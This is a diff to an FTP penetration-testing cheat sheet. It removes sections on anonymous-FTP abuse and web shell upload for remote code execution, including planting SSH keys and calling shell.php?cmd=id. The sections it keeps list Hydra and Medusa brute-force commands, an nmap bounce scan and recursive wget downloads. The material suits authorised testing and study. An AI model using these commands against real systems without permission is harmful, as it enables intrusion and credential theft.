@@ -82,47 +82,7 @@ MKD <dir>
 RMD <dir>
 
 --------------------------------
-5. ACTIVE vs PASSIVE MODE
---------------------------------
-
-Active:
-- Client opens random port
-- Server connects back from port 20
-- Often blocked by firewalls
-
-Passive (PASV):
-- Server opens random port
-- Client connects to it
-- Preferred for pentesting
-
---------------------------------
-6. ANONYMOUS FTP ABUSE
---------------------------------
-
-# Check write permission
-put test.txt
-
-# Upload web shell (if web root)
-put shell.php
-
-# Upload SSH key (if home directory)
-mkdir .ssh
-put authorized_keys
-
---------------------------------
-7. COMMON FTP MISCONFIGURATIONS
---------------------------------
-
-- Anonymous login enabled
-- Write permission for anonymous
-- Home directory = web root
-- Backup files (.bak, .old, .zip)
-- Hardcoded credentials in files
-- No chroot jail
-- Plaintext credentials
-
---------------------------------
-8. BRUTE FORCE
+5. BRUTE FORCE
 --------------------------------
 
 # Hydra
@@ -134,14 +94,14 @@ hydra -L users.txt -P passwords.txt ftp://<IP>
 medusa -h <IP> -u <user> -P passwords.txt -M ftp
 
 --------------------------------
-9. FTP BOUNCE ATTACK
+6. FTP BOUNCE ATTACK
 --------------------------------
 
 # Check bounce support
 nmap -b <user>:<pass>@<FTP_IP> <TARGET_IP>
 
 --------------------------------
-10. FILE DISCOVERY
+7. FILE DISCOVERY
 --------------------------------
 
 # Download everything
@@ -150,21 +110,7 @@ wget -r ftp://<IP>/
 wget -r ftp://anonymous:anonymous@<IP>/
 
 --------------------------------
-11. FTP + WEB PIVOT
---------------------------------
-
-Scenario:
-- FTP write access
-- Directory is web root
-- Upload web shell
-- Gain RCE
-
-Example:
-put shell.php
-http://target/shell.php?cmd=id
-
---------------------------------
-12. LOG FILES (SERVER SIDE)
+8. LOG FILES (SERVER SIDE)
 --------------------------------
 
 Common locations:
@@ -173,7 +119,7 @@ Common locations:
 - /var/log/proftpd/
 
 --------------------------------
-13. COMMON FTP SERVICES
+9. COMMON FTP SERVICES
 --------------------------------
 
 vsftpd
@@ -183,44 +129,11 @@ FileZilla Server
 Microsoft FTP Service
 
 --------------------------------
-14. FTP EXPLOIT CHECK
+10. FTP EXPLOIT CHECK
 --------------------------------
 
 searchsploit vsftpd
 searchsploit proftpd
 searchsploit ftp
 
---------------------------------
-15. POST-EXPLOIT IDEAS
---------------------------------
 
-- Credential reuse
-- Config file harvesting
-- SSH pivot
-- Web access escalation
-- Backup database extraction
-
---------------------------------
-16. DETECTION NOTES
---------------------------------
-
-- Plaintext credentials
-- IDS rarely blocks FTP
-- Logging often weak
-- Passive ports often wide open
-
---------------------------------
-17. QUICK CHECKLIST
---------------------------------
-
-[ ] Anonymous login?
-[ ] Write permission?
-[ ] Web root?
-[ ] Backup files?
-[ ] Credentials inside files?
-[ ] Version vulnerable?
-[ ] Bounce enabled?
-
-==============================
-END OF FTP CHEAT SHEET
-==============================
